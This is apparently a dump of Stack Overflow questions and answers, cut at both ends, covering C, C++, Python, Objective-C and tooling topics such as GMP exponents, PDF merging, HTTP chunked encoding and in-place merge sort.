    struct derived1 d1;
    derived1_init(&amp;d1);

    struct derived2 d2;
    derived2_init(&amp;d2);

    struct base *b1_ptr = (struct base *)&amp;d1;
    struct base *b2_ptr = (struct base *)&amp;d2;

    base_dance(b1_ptr);  /* calls derived1_dance */
    base_dance(b2_ptr);  /* calls derived2_dance */

    base_jump(b1_ptr, 42);  /* calls derived1_jump */
    base_jump(b2_ptr, 42);  /* calls derived2_jump */

    return 0;
}
</code></pre>

<p>And that's how you do polymorphism in C.  It ain't pretty, but it does the job.  There are some sticky issues involving pointer casts between base and derived classes, which are safe as long as the base class is the first member of the derived class.  Multiple inheritance is much harder - in that case, in order to case between base classes other than the first, you need to manually adjust your pointers based on the proper offsets, which is really tricky and error-prone.</p>

<p>Another (tricky) thing you can do is change the dynamic type of an object at runtime!  You just reassign it a new vtable pointer.  You can even selectively change some of the virtual functions while keeping others, creating new hybrid types.  Just be careful to create a new vtable instead of modifying the global vtable, otherwise you'll accidentally affect all objects of a given type.</p>
"
"<p>I've just discovered, to my embarrassment, that feeding negative exponents to <code>mpz_pow_ui</code> doesn't work very well. (""The manual does say unsigned long, you know."") For the other <code>mpz_pow</code> functions, the manual uses concepts I don't understand. For example ""<em>base</em>^<em>exp</em> mod <em>mod</em>"" in the following:</p>

<pre><code>void mpz_powm (mpz_t rop, mpz_t base, mpz_t exp, mpz_t mod) 
void mpz_powm_ui (mpz_t rop, mpz_t base, unsigned long int exp, mpz_t mod)
Set _rop_ to _base_^_exp_ mod _mod_.
Negative exp is supported if an inverse base-1 mod mod exists (see mpz_invert in Section 5.9 [Number Theoretic Functions], page 35). If an inverse doesn’t exist then a divide by zero is raised.
</code></pre>

<p>In the following code, what do I have to change to make it able to handle negative exponents?</p>

<pre><code>#define Z(x) mpz_t x; mpz_init( x );

BSTR __stdcall IBIGPOWER(BSTR p1, long p2 ) {
    USES_CONVERSION;

    Z(n1);
    Z(res);

    LPSTR sNum1 = W2A( p1 );

    mpz_set_str( n1, sNum1, 10 );

    mpz_pow_ui( res, n1, p2 );

    char * buff =  (char *) _alloca( mpz_sizeinbase( res, 10 ) + 2 );

    mpz_get_str(buff, 10, res);

    BSTR bResult = _com_util::ConvertStringToBSTR( buff );
    return bResult;
}
</code></pre>
","9530","Adam Rosenfield","<p>The <code>mpz_t</code> data type can only store integers, and 2<sup>-18</sup> is not an integer.  To calculate that, you'll have to use the floating-point type <a href=""http://gmplib.org/manual/Floating_002dpoint-Functions.html#Floating_002dpoint-Functions"" rel=""nofollow""><code>mpf_t</code></a> or the rational number type <a href=""http://gmplib.org/manual/Rational-Number-Functions.html#Rational-Number-Functions"" rel=""nofollow""><code>mpq_t</code></a>.</p>
"
"<p>I have a button that correctly wired such that when it is clicked, the ""login"" IBAction is hit.</p>

<pre><code>- (IBAction) login: (id)sender
{
    NSLog(@""OK"");
}
</code></pre>

<p>Now, I wired the button to the username/password text fields using ""takeStringValueFrom"" but I don't understand how to then get at those values? </p>

<p>Hope that makes sense. </p>

<p>EDIT: so basically, when i click the ""login"" button the above event fires. I'd like to grab the values from two text boxes on that same window, what is the best way to accomplish this? I suppose I could use IBOutlet for each of the text boxes ... is this the correct way? </p>

<p>Re-reading <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSControl_Class/Reference/Reference.html#//apple_ref/occ/instm/NSControl/takeStringValueFrom%3a"" rel=""nofollow"">the doc</a>, it's possible ""takeStringValueFrom"" isn't what i thought it was. </p>
","9530","Adam Rosenfield","<p>You want to declare your username and password textfields as <code>IBOutlet</code>s, and then hook them up in Interface Builder.  Then, in your <code>login</code> handler, you use the <code>stringValue</code> message to extract their values:</p>

<pre><code>- (IBAction) login: (id)sender
{
    NSString *username = [usernameTextField stringValue];
    NSString *password = [passwordTextField stringValue];

    // check username &amp; password
}
</code></pre>
"
"<p>What does the <code>if __name__ == ""__main__"":</code> do?</p>

<pre><code># Threading example
import time, thread

def myfunction(string, sleeptime, lock, *args):
    while 1:
        lock.acquire()
        time.sleep(sleeptime)
        lock.release()
        time.sleep(sleeptime)
if __name__ == ""__main__"":
    lock = thread.allocate_lock()
    thread.start_new_thread(myfunction, (""Thread #: 1"", 2, lock))
    thread.start_new_thread(myfunction, (""Thread #: 2"", 2, lock))
</code></pre>

<p>Also, what does <code>*args</code> mean in this example?</p>
","9530","Adam Rosenfield","<p>When your script is run by passing it as a command to the Python interpreter,</p>

<pre><code>python myscript.py
</code></pre>

<p>all of the code that is at indentation level 0 gets executed.  Functions and classes that are defined are, well, defined, but none of their code gets ran.  Unlike other languages, there's no <code>main()</code> function that gets run automatically - the <code>main()</code> function is implicitly all the code at the top level.</p>

<p>In this case, the top-level code is an <code>if</code> block.  <code>__name__</code> is a built-in variable which evaluate to the name of the current module.  However, if a module is being run directly (as in <code>myscript.py</code> above), then <code>__name__</code> instead is set to the string <code>""__main__""</code>.  Thus, you can test whether your script is being run directly or being imported by something else by testing</p>

<pre><code>if __name__ == ""__main__"":
    ...
</code></pre>

<p>If that code is being imported into another module, the various function and class definitions will be imported, but the <code>main()</code> code won't get run.  As a basic example, consider the following two scripts:</p>

<pre><code># file one.py
def func():
    print(""func() in one.py"")

print(""top-level in one.py"")

if __name__ == ""__main__"":
    print(""one.py is being run directly"")
else:
    print(""one.py is being imported into another module"")

# file two.py
import one

print(""top-level in two.py"")
one.func()

if __name__ == ""__main__"":
    print(""two.py is being run directly"")
else:
    print(""two.py is being imported into another module"")
</code></pre>

<p>Now, if you invoke the interpreter as</p>

<pre><code>python one.py
</code></pre>

<p>The output will be</p>

<pre><code>top-level in one.py
one.py is being run directly
</code></pre>

<p>If you run <code>two.py</code> instead:</p>

<pre><code>python two.py
</code></pre>

<p>You get</p>

<pre><code>top-level in one.py
one.py is being imported into another module
top-level in two.py
func() in one.py
two.py is being run directly
</code></pre>

<p>Thus, when module <code>one</code> gets loaded, its <code>__name__</code> equals <code>""one""</code> instead of <code>__main__</code>.</p>
"
"<p>Using Perl, how can I combine or merge the sample PDF files into a single PDF file?</p>
","9530","Adam Rosenfield","<p>You can use the <a href=""http://www.ghostscript.com/"" rel=""nofollow"">GhostScript</a> utility <code>pdf2ps</code> to convert the PDFs into PostScript files, concatenate the PostScript files, and then use <code>ps2pdf</code> to convert the result back into a PDF.</p>
"
"<p>Many of my users have been telling me that they'd like to run my software on their Linux machines under Wine.</p>

<p>But I'm a Windows Developer who has practically no experience with Linux.</p>

<p>Now I could spend a month or two installing Linux, learning Linux, installing Wine, learning Wine, and thoroughly ensure my application runs well under Wine. But I am still developing for Windows, so I don't want to take so much time away from development right now.</p>

<p>So what can I do without too much effort to get my program running as well as possible under Wine?</p>

<p><hr /></p>

<p>I did find <a href=""http://appdb.winehq.org/help/?sTopic=generic"">this General help on running applications under Wine</a>.</p>
","9530","Adam Rosenfield","<p>As long as you're not doing anything unusual such as playing around with hardware or poking around in undocumented API calls and data structures, you should be able to run your code under Wine with few or no modifications.  Wine has a fairly complete implementation of the public Windows APIs, so if your program plays nice and doesn't mess around, it should just work.</p>
"
"<p>When i use this cmd line :
jar cmf arshad.mf ars.jar *.class 
i get this error :</p>

<pre><code>invalid header field name:Manifest-version
</code></pre>

<p>This is my manifest file :</p>

<pre><code>Manifest-Version: 1.0
Main-Class:t
</code></pre>

<p>i made the manifest file with notepad in UTF-8 encoding - is there any problem with the manifest ?</p>
","9530","Adam Rosenfield","<p>Add a space after the colons:</p>

<pre><code>Manifest-Version: 1.0
Main-Class: t
</code></pre>
"
"<p>I believe i can learn thing or two if i can see the implementation files (.m files). Is there any way the i can view NSString.m or NSNumber.m files? and others? If i try to find these files using spotlight, i get nothing.</p>
","9530","Adam Rosenfield","<p>No, most (all?) of the Cocoa library implementations are only distributed in a compiled binary form.  You could disassemble them, but that's probably against the Mac OS X EULA, and it also wouldn't help you understand them at all.</p>

<p>You could take a look at <a href=""http://www.cocotron.org/"">Cocotron</a>, which is an open-source implementation of Cocoa.  It won't be exactly the same, but at least for the core classes, it will be virtually identical.</p>
"
"<p>In C/C++, if a multi-byte wide character (wchar_t) value is transmitted from a big-endian system to a little-endian system (or vice-versa), will it come out the same value on the other side?  Or will the bytes need to be swapped?</p>
","9530","Adam Rosenfield","<p>Yes, you need to perform endian conversion.  Define carefully your serialization format, i.e. the byte order of data that is transmitted over the network or stored into a disk file.  Then, when sending data, convert from native to wire format (may or may not require byte swapping), and when receiving data, convert from wire to native format (again may or may not require byte swapping).  You should pick a wire format that will be used by the majority of clients to minimize the average amount of byte swapping.</p>
"
"<p>I'm having problems allocating and deallocating my memory in a recursive C++ program. So without using an automatic memory management solution, I wonder if anyone can help me resolve the memory leak I am experiencing.</p>

<p>The following code essentially explains the problem (although it's a contrived example, please correct any mistakes or simplifications I've made).</p>

<p>A number class to hold the value of a number:</p>

<pre><code>class Number
{
    public:
        Number() { value = 1; };

        Number&amp; operator + (const Number&amp; n1) const
        {
            Number result = value + n1.value;
            return result;
        };

        int value;
};
</code></pre>

<p>Two functions to perform the recursion:</p>

<pre><code>Number&amp; recurse(const Number&amp; v1)
{
    Number* result = new Number();

    Number one = Number();
    *result = *result + recurse(one);

    return *result;
}

int main(...)
{
    Number answer = Number();
    answer = recurse(result);
}
</code></pre>

<p>As you can see the memory allocated in the recurse function is leaked, but I'm not sure where I can free up this memory from based on the nature of the recursion?</p>

<p>Thanks,</p>

<p>Dan</p>
","9530","Adam Rosenfield","<p>The problem is here:</p>

<pre><code>Number&amp; operator + (const Number&amp; n1) const
{
    Number result = value + n1.value;
    return result;
};
</code></pre>

<p>You're returning a local variable (<code>result</code>) by reference, and that's a big NO-NO.  Local variables are allocated on the stack, and when the function exits, the variables are gone.  Returning a reference to a local variable is returning a pointer into the stack that's now being used for something else, and that's going to cause lots of badness.</p>

<p>What you should instead do is return by value (just change the return type from <code>Number&amp;</code> to <code>Number</code>).  Make sure you have an appropriate copy constructor, or that the compiler's automatically generated copy constructor suits your needs.  This means when <code>operator+</code> returns, it makes a copy (which can often by optimized away), and since there's no pointers or references involved, you can't get a corrupted return value.</p>

<p>To fix your memory leak, you can use smart pointers such as <code>boost::shared_ptr</code>.  Alternatively, ditch pointers and dynamic memory altogether, and just return your results by value from <code>recurse()</code>.</p>
"
"<p>The OpenGroup POSIX.1-2001 defines <a href=""http://www.opengroup.org/onlinepubs/000095399/functions/strerror.html"">strerror_r</a>, as does <a href=""http://refspecs.freestandards.org/LSB_3.1.0/LSB-Core-generic/LSB-Core-generic/baselib-strerror-r.html"">The Linux Standard Base Core Specification 3.1</a>.  But I can find no reference to the maximum size that could be reasonably expected for an error message. I expected some define somewhere that I could put in my code but there is none that I can find.</p>

<p><em>The code must be thread safe.</em> Which is why strerror_r is used and not strerror.</p>

<p>Does any one know the symbol I can use? I should I create my own?</p>

<p><hr /></p>

<h2>Example</h2>

<pre><code>int result = gethostname(p_buffy, size_buffy);
int errsv = errno;
if (result &lt; 0)
{
    char buf[256];
    char const * str = strerror_r(errsv, buf, 256);
    syslog(LOG_ERR,
             ""gethostname failed; errno=%d(%s), buf='%s'"",
             errsv,
             str,
             p_buffy);
     return errsv;
}
</code></pre>

<p><hr /></p>

<p><strong>From the documents:</strong></p>

<p>The Open Group Base Specifications Issue 6:</p>

<blockquote>
  <p><strong>ERRORS</strong></p>
  
  <p>The strerror_r() function may fail if:</p>
  
  <ul>
  <li><strong>[ERANGE]</strong> Insufficient storage was supplied via strerrbuf and buflen to
  contain the generated message string.</li>
  </ul>
</blockquote>

<p><hr /></p>

<p><strong>From the source:</strong></p>

<p>glibc-2.7/glibc-2.7/string/strerror.c:41:</p>

<pre><code>    char *
    strerror (errnum)
         int errnum;
    {
        ...
        buf = malloc (1024);
</code></pre>
","9530","Adam Rosenfield","<p>I wouldn't worry about it - a buffer size of 256 is far more than sufficient, and 1024 is overkill.  You could use <code>strerror()</code> instead of <code>strerror_r()</code>, and then optionally <code>strdup()</code> the result if you need to store the error string.  This isn't thread-safe, though.  If you really need to use <code>strerror_r()</code> instead of <code>strerror()</code> for thread safety, just use a size of 256.  In <code>glibc-2.7</code>, the longest error message string is 50 characters (""Invalid or incomplete multibyte or wide character"").  I wouldn't expect future error messages to be significantly longer (in the worst case, a few bytes longer).</p>
"
"<p>i have a c function which returns a <code>long double</code>.  i'd like to call this function from python using ctypes, and it mostly works.  setting <code>so.func.restype = c_longdouble</code> does the trick -- except that python's float type is a <code>c_double</code> so if the returned value is larger than a double, but well within the bounds of a long double, python still gets inf as the return value.  i'm on a 64 bit processor and <code>sizeof(long double)</code> is 16.</p>

<p>any ideas on getting around this (e.g. using the decimal class or numpy) without modifying the c code?</p>
","9530","Adam Rosenfield","<p>I'm not sure you can do it without modifying the C code.  ctypes seems to have really bad support for <code>long double</code>s - you can't manipulate them like numbers at all, all you can do is convert them back and forth between the native <code>float</code> Python type.</p>

<p>You can't even use a byte array as the return value instead of a <code>c_longdouble</code>, because of the ABI - floating-point values aren't returned in the <code>%eax</code> register or on the stack like normal return values, they're passed through the hardware-specific floating-point registers.</p>
"
"<p>In ANSI C++, how can I assign the cout stream to a variable name? What I want to do is, if the user has specified an output file name, I send output there, otherwise, send it to the screen. So something like:</p>

<pre><code>ofstream outFile;
if (outFileRequested) 
    outFile.open(""foo.txt"", ios::out);
else
    outFile = cout;  // Will not compile because outFile does not have an 
                     // assignment operator

outFile &lt;&lt; ""whatever"" &lt;&lt; endl;
</code></pre>

<p>I tried doing this as a Macro function as well:</p>

<pre><code>#define OUTPUT outFileRequested?outFile:cout

OUTPUT &lt;&lt; ""whatever"" &lt;&lt; endl;
</code></pre>

<p>But that gave me a compiler error as well.</p>

<p>I supposed I could either use an IF-THEN block for every output, but I'd like to avoid that if I could. Any ideas? </p>
","9530","Adam Rosenfield","<p>Use a reference.  Note that the reference must be of type <code>std::ostream</code>, not <code>std::ofstream</code>, since <code>std::cout</code> is an <code>std::ostream</code>, so you must use the least common denominator.</p>

<pre><code>std::ofstream realOutFile;

if(outFileRequested)
    realOutFile.open(""foo.txt"", std::ios::out);

std::ostream &amp; outFile = (outFileRequested ? realOutFile : std::cout);
</code></pre>
"
"<p>To quote <a href=""http://en.wikipedia.org/wiki/Weak_typing"">Wikipedia</a>:</p>

<blockquote>
  <p>Two commonly used languages that
  support many kinds of implicit
  conversion are C and C++, and it is
  sometimes claimed that these are
  weakly typed languages. However,
  others argue that these languages
  place enough restrictions on how
  operands of different types can be
  mixed, that the two should be regarded
  as strongly typed languages.</p>
</blockquote>

<p>Is there a more definitive answer?</p>
","9530","Adam Rosenfield","<p>It's hard to classify every language into 'weakly' or 'strongly' typed -- it's more of a continuum.  But, in comparison to other languages, C is fairly strongly typed.  Every object has a compile-time type, and the compiler will let you know (loudly) if you're doing something with an object that its type doesn't let you do.  For example, you can't call functions with the wrong types of parameters, access struct/union members which don't exist, etc.</p>

<p>But there are a few weaknesses.  One major weakness is typecasts - they essentially say that you're going to be mucking around with the types of objects, and the compiler should be quiet (when it can).  <code>void*</code> is also another weakness -- it's a generic pointer to an unknown type, and when you use them, you have to be extra careful that you're doing the right thing.  The compiler can't statically check most uses of <code>void*</code>.  <code>void*</code> can also be converted to a pointer to any type without a cast (only in C, not in C++), which is another weakness.</p>
"
"<p>How would I go about programatically changing the desktop background in Mac OS X?  I'd like to use python, but I'm interested in any way possible.  Could I hook up to Terminal and call a certain command?</p>
","9530","Adam Rosenfield","<p>To add to <a href=""http://stackoverflow.com/questions/431205/how-can-i-programatically-change-the-background-in-mac-os-x#431273"">Matt Miller's response</a>: you can use <a href=""http://docs.python.org/library/subprocess.html#subprocess.call"" rel=""nofollow"">subprocess.call()</a> to execute a shell command as so:</p>

<pre><code>import subprocess
subprocess.call([""defaults"", ""write"", ""com.apple.Desktop"", ""background"", ...])
</code></pre>
"
"<p>As an addition to my previous post on <a href=""http://stackoverflow.com/questions/409087/creating-a-web-server-in-pure-c"">Creating a web server in pure C</a>, I'm having some trouble with the Sending function. Here's two code snippets:</p>

<pre><code>int Send(char *message)
{
        int length, bytes_sent;
        length = strlen(message);

        bytes_sent = send(connecting_socket, message, length, 0);

        return bytes_sent;
}
</code></pre>

<p>This code sends void * to the current socket. Works like a charm!</p>

<p>Now here comes the SendHTML</p>

<pre><code>void SendHTML(char *Status_code, char *Content_Type, char *HTML)
{
        char *head = ""\r\nHTTP/1.1 "";
        char *content_head = ""\r\nContent-Type: "";
        char *server_head = ""\r\nServer: PT06"";
        char *length_head = ""\r\nContent-Length: "";
        char *date_head = ""\r\nDate: "";
        char *newline = ""\r\n"";
        char Content_Length[100];
        int content_length = strlen(HTML);

        sprintf(Content_Length, ""%i"", content_length);

        char *message = malloc((
                strlen(head) +
                strlen(content_head) +
                strlen(server_head) +
                strlen(length_head) +
                strlen(date_head) +
                strlen(newline) +
                strlen(Status_code) +
                strlen(Content_Type) +
                strlen(Content_Length) +
                content_length +
                sizeof(char)) * 2);

        if ( message != NULL )
        {
                time_t rawtime;

                time ( &amp;rawtime );

                strcpy(message, head);

                strcat(message, Status_code);

                strcat(message, content_head);
                strcat(message, Content_Type);
                strcat(message, server_head);
                strcat(message, length_head);
                strcat(message, Content_Length);
                strcat(message, date_head);
                strcat(message, (char*)ctime(&amp;rawtime));
                strcat(message, newline);
                strcat(message, HTML);

                Send(message);

                free(message);
        }     
}
</code></pre>

<p>If I were to add</p>

<pre><code>Send(""Oh end of HTML Sending eh?"");
</code></pre>

<p>after <code>Send(message)</code> and before <code>free(message)</code>, this isn't sent to the browser?</p>

<p>I figured this might be a HTTP 1.1 issue, does the RFC say that i can only do one Send? Does the browser Close the connection after it receives the first message?</p>

<p>How do I solve this so I could do the following:</p>

<pre><code>SendHTML(""200 OK"", ""text/plain"", ""HAaaaii!!"");
Send(""lolwut?"");
</code></pre>

<p>This should result in the Browser showing:</p>

<blockquote>
  <p>HAaaaii!!lolwut?</p>
</blockquote>
","9530","Adam Rosenfield","<p>In your <code>head</code> variable, there should be no leading <code>""\r\n""</code>.  That's probably what's causing the problem.  Also, when you're malloc'ing your message, you're not reserving enough space for the date+time (26 bytes according to the documentation for <code>ctime(3)</code>), so you're almost certainly overwriting your buffer and causing heap corruption.</p>

<p>If you want to start sending data before you know what the Content-Length is, you can instead use the <a href=""http://tools.ietf.org/html/rfc2616#section-3.6.1"" rel=""nofollow"">chunked transfer encoding</a>.  The chunked transfer encoding says, ""I'm going to keep giving you a bunch of data in chunks, and I can tell you how long each chunk is, but I don't know how many chunks there are until I'm done.""  For example, Google uses the chunked transfer encoding.  Here's a trace of an HTTP request for the Google homepage, generated with <a href=""http://curl.haxx.se/"" rel=""nofollow"">cURL</a>:</p>

<pre><code>curl www.google.com --trace-ascii -
</code></pre>


(Header snipped -- but no Content-Length header)


<p>The data stream consists of the chunk size (in hexadecimal) followed by a CRLF, then the data bytes.  In this case, there was only one chunk, but there could easily have been more.  After the last chunk, a chunk size of 0 is transmitted, indicating the last chunk.</p>
"
"<p>I'm following along with <a href=""http://stackoverflow.com/questions/319463/can-i-make-post-or-get-requests-from-an-iphone-application#322573"">this useful looking answer to my question</a>.</p>

<p>It seems to be working, but here are two questions I have:</p>

<ol>
<li>How do I detect an HTTP error?  The didFailWithError method doesn't seem to be getting called?</li>
</ol>

<p><strong>UPDATE:</strong> <a href=""http://www.gigliwood.com/weblog/Cocoa/Q__When_is_an_conne.html"">It considers any response a success</a>. So I guess I have to handle HTTP errors in the didRecieveResponse method, but besides telling the user there was an error when I hit an HTTP error, do I need stop the connection somehow?  And/or cleanup?</p>

<ol>
<li>I see this line in the answer:</li>
</ol>

<blockquote>
<pre><code>[[NSURLConnection alloc] initWithRequest:request delegate:self];
</code></pre>
</blockquote>

<p>Do I need to release that?  Where, how, when?</p>
","9530","Adam Rosenfield","<p>Yes, you need to release that object.  See the <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/Tasks/MemoryManagementRules.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a>.  Basically, if you ever create an object with a method name that begins with <code>alloc</code> or <code>new</code> or contains <code>copy</code>, you become an owner of the object and are responsible for freeing it later.  Only in the case where you know you're going to need the object up until program termination is it ok not to free it, in which case the operating system reclaims the memory when your app terminates.</p>

<p>If you only need the object within a small scope, you can send it the <code>autorelease</code> message.  This will add it to the autorelease pool.  The autorelease pool periodically sends a <code>release</code> message to each object in it.  It's kind of complicated; see the section on <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/Concepts/AutoreleasePools.html#//apple_ref/doc/uid/20000047"" rel=""nofollow"">autorelease pools</a>.  For example:</p>

<p>In this case, though, because <code>NSURLConnection</code>s are asynchronous, autoreleasing won't work.  You don't know exactly when it's going to call back into your object with data, so you want to make sure the object hasn't been released yet.  The only way to be sure is to know exactly when you're done with the object, and then send it a <code>release</code> message yourself.</p>

<p>All of the various <code>init*</code> functions return a pointer to the given object, so you can just do:</p>

<pre><code>NSURLConnection *connection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
...
// when done with connection:
[connection release];
</code></pre>
"
"<p>Is there a way, in Linux, Windows, or preferably Mac OS X to take a bunch of PDF files and ""chain them"" into one ""booklet"" without owning Acrobat and preferably without doing this manually?</p>

<p>I have TexShop, MikTex and the like installed, if any of their utilities help.</p>
","9530","Adam Rosenfield","<p>I've mentioned it in the other topics and I'll mention it again: you can use the <a href=""http://www.ghostscript.com/"" rel=""nofollow"">Ghostscript</a> utilities <code>pdf2ps</code> and <code>ps2pdf</code> do it as so:</p>

<pre><code>pdf2ps file1.pdf file1.ps  # Convert file1 to PostScript
pdf2ps file2.pdf file2.ps  # Convert file2 to PostScript
cat file2.ps &gt;&gt; file1.ps   # Concatenate files
ps2pdf file1.ps output.pdf # Convert back to PDF
</code></pre>
"
"<p>I know under Linux it's pretty easy to just change e.g. LC_NUMERIC for a single invocation:</p>

<pre><code>LC_NUMERIC=de_DE ./app
</code></pre>

<p>Is there a similar way for doing that under Windows for a single application? I don't want change the locale for my whole system.</p>

<p>For details, it's about Songbird which has <a href=""http://bugzilla.songbirdnest.com/show_bug.cgi?id=12443"" rel=""nofollow"" title=""songbird locale bug"">locale bug when displaying numbers</a>. Until there's a fix I would like just to switch the locale for that application only.</p>
","9530","Adam Rosenfield","<p>Have you tried doing the same thing with environment variables?  I don't know if it will work, but you can try the following batch script:</p>

<pre><code>SET LC_NUMERIC=de_DE
app
</code></pre>

<p>(Or you can use the same Linux command if you're using <a href=""http://www.cygwin.org"" rel=""nofollow"">Cygwin</a>).</p>
"
"<p>I was having a look at <a href=""http://java.sun.com/docs/books/tutorial/essential/io/cl.html"" rel=""nofollow"">this</a> tutorial at Sun on command line I/O. It stated that:</p>

<blockquote>
  <p>You might expect the Standard Streams
  to be character streams, but, for
  historical reasons, they are byte
  streams. System.out and System.err are
  defined as PrintStream objects.
  Although it is technically a byte
  stream, PrintStream utilizes an
  internal character stream object to
  emulate many of the features of
  character streams.</p>
</blockquote>

<p>Does any one know what ""the historical reasons"" are?</p>
","9530","Adam Rosenfield","<p>I would guess that the reason is to be backwards-compatible with POSIX C/C++ standard I/O, in which stdin, stdout, and stderr (the C/C++ equivalent of System.in, System.out, and System.err respectively) are byte streams.  In Windows, those streams perform CRLF translation, but in POSIX systems, no such conversions occur, and you can freely read and write non-character binary data.  Lots of Unix utilities do this, such as GNU's <code>gzip</code> and <code>tar</code>.</p>
"
"<p>What is the most evil or dangerous code fragment you have ever seen in a production environment at a company?  I've never encountered production code that I would consider to be deliberately malicious and evil, so I'm quite curious to see what others have found.</p>

<p>The most dangerous code I have ever seen was a stored procedure two linked-servers away from our core production database server.  The stored procedure accepted any NVARCHAR(8000) parameter and executed the parameter on the target production server via an double-jump sp_executeSQL command.  That is to say, the sp_executeSQL command executed another sp_executeSQL command in order to jump two linked servers.  Oh, and the linked server account had sysadmin rights on the target production server.</p>
","9530","","<p>Any <a href=""http://tools.ietf.org/html/rfc3514"" rel=""nofollow"">RFC 3514</a>-compliant program which sets the <a href=""http://en.wikipedia.org/wiki/Evil%5Fbit"" rel=""nofollow"">evil bit</a>.</p>
"
"<p>Is there any way to get the boost libraries source code? I have browsed the SVN repository and I could see only HPP files. No source files are available there. I would like to look into the source code for ""shared_ptr"". Can anyone guide me?</p>

<p>Also from where can I download <a href=""http://www.boost.org/doc/libs/1_37_0/tools/bcp/bcp.html"">BCP</a> utility?</p>
","9530","Adam Rosenfield","<p>The vast majority of the source code is entirely in the header files - it has to be in order for templates to work.  You cannot put template code in source files and compile them separately.</p>
"
"<p>Where can I get a decent high-level description of the algorithm used in <code>__merge_without_buffer()</code> in the C++ STL?  I'm trying to reimplement this code in the D programming language, with some enhancements.  I can't seem to grok what it's doing at the algorithmic level from just reading the STL source code because there are too many low-level details obscuring it.  Also, I don't want to just blindly translate the code because then, if it didn't work I wouldn't know why, and I wouldn't be able to add my enhancements.</p>
","9530","Adam Rosenfield","<p><code>__merge_without_buffer()</code> is performing an <strong>in-place merge</strong>, as the merge step of an in-place merge sort.  It takes as input two ranges of data <code>[first, middle)</code> and <code>[middle, last)</code> which are assumed to already be sorted.  The <code>len1</code> and <code>len2</code> parameters are equal to the lengths of the two input ranges, namely <code>(middle - first)</code> and <code>(last - middle)</code> respectively.</p>

<p>First, it picks a <em>pivot</em> element.  Then, it rearranges the data into the order <code>A1 B1 A2 B2</code>, where <code>A1</code> is the set of elements in <code>[first, middle)</code> that are less than the pivot, <code>A2</code> is the set of elements in <code>[first, middle)</code> greater than or equal to the pivot, <code>B1</code> is the set of elements in <code>[middle, last)</code> less than the pivot, and <code>B2</code> is the set of elements in <code>[middle, last)</code> greater than or equal to the pivot.  Note that the data is originally in the order <code>A1 A2 B1 B2</code>, so all we need to do is to turn <code>A2 B1</code> into <code>B1 A2</code>.  This is with a call to <code>std::rotate()</code>, which does just that.</p>

<p>Now we've separated out the elements which are less than the pivot (<code>A1</code> and <code>B1</code>) from those that are greater than or equal to the pivot (<code>A2</code> and <code>B2</code>), so now we can recursively merge the two subranges <code>A1 A2</code> and <code>B1 B2</code>.</p>

<p>How do we choose a pivot?  In the implementation I'm looking at, it chooses the median element from the larger subrange (i.e. if <code>[first, middle)</code> has more elements than <code>[middle, last)</code>, it chooses the median of <code>[first, middle)</code>; otherwise, it chooses the median of <code>[middle, last)</code>).  Since the subranges are already sorted, choosing the median is trivial.  This pivot choice ensures that when recursively merging the two subranges, each subproblem is no more than 3/4 the size of the current problem, because in the worst case, at least 1/4 of the elements are larger than or smaller than the pivot.</p>

<p>What is the running time of this?  The <code>std::rotate()</code> call takes O(N) time, and we make two recursive calls to ourselves.  This equates to a running time of O(N log N).  However, note that this is only one step in mergesort: remember that in mergesort you first recursively sort both halves and then merge.  Thus, the recurrence relation for the running time of mergesort is now:</p>

<p><code>T(N) = 2T(N/2) + O(N log N)</code></p>

<p>Plug this into the <a href=""http://en.wikipedia.org/wiki/Master_theorem"" rel=""nofollow"">Master theorem</a>, and you get that mergesort now runs in O(N log<sup>2</sup> N) time!</p>

<p>As an interesting final point, consider the following three qualities of a comparison-based sorting algorithm:</p>

<ol>
<li>In-place</li>
<li>Stable</li>
<li>Runs in O(N log N) time</li>
</ol>

<p>You can usually only get 2 of these at once - quicksort gets you (1) and (3), mergesort gets you (2) and (3), and an in-place mergesort gets you (1) and (2).  Non-comparison-based sorts such as count sort can achieve all 3, but those sorts can only sort certain data types.  It's possible there exists a comparison-based sort which achieves all 3, but if there is, I'm not aware of its existence, and it's almost certainly much more complicated.</p>
"
"<p>This is probably a kinda commonly asked question but I could do with help on this. I have a list of class objects and I'm trying to figure out how to make it print an item from that class but rather than desplaying in the;</p>

<pre><code>&lt;__main__.evolutions instance at 0x01B8EA08&gt;
</code></pre>

<p>but instead to show a selected attribute of a chosen object of the class. Can anyone help with that?</p>
","9530","Adam Rosenfield","<p>If you want to just display a particular attribute of each class instance, you can do</p>

<pre><code>print([obj.attr for obj in my_list_of_objs])
</code></pre>

<p>Which will print out the <code>attr</code> attribute of each object in the list <code>my_list_of_objs</code>.  Alternatively, you can define the <code>__str__()</code> method for your class, which specifies how to convert your objects into strings:</p>

<pre><code>class evolutions:
    def __str__(self):
        # return string representation of self

print(my_list_of_objs)  # each object is now printed out according to its __str__() method
</code></pre>
"
"<p>I need to dump the certain things into a text file and same has needs to be displayed on screen. (I'm telling about a C program utiltiy)
The menu option looks like following,</p>

<pre>
1. display AA parameters
2. display BB parameters
3. display CC parameters
4. dump all
5. Exit
Select option >
</pre>

<p>If they select 1/2/3, it just needs to displayed on screen only or if they select option #4,it need to display all the parameters one by one and same needs to dumped in a .txt file.</p>

<p>I know, we can use the printf and fprintf functions to display on screen and write it to text file respectively. The thing is that I've display more that 20 parameters and each have at least 20 sub-parameters.</p>

<p>I'm currently implemented as below,</p>

<pre><code>printf (        ""Starting serial number       [%ld]\n"", 
        serial_info_p-&gt;start_int_idx);
fprintf(file_p, ""Starting serial number       [%ld]\n"", 
        serial_info_p-&gt;start_int_idx)
printf (        ""Current Serial number         [%d]\n"", 
        serial_info_p-&gt;current_int_idx);
fprintf(file_p, ""Current Serial number         [%d]\n"", 
        serial_info_p-&gt;current_int_idx);
</code></pre>

<p>Is there an easiest way to implement this to cut down the number of lines of code?</p>
","9530","Adam Rosenfield","<p>You could also just pipe the output of your prorgam to the <a href=""http://en.wikipedia.org/wiki/Tee_(unix)"" rel=""nofollow""><code>tee(1)</code></a> command.</p>
"
"<p>This is a good one because it's so counter-intuitive:</p>

<blockquote>
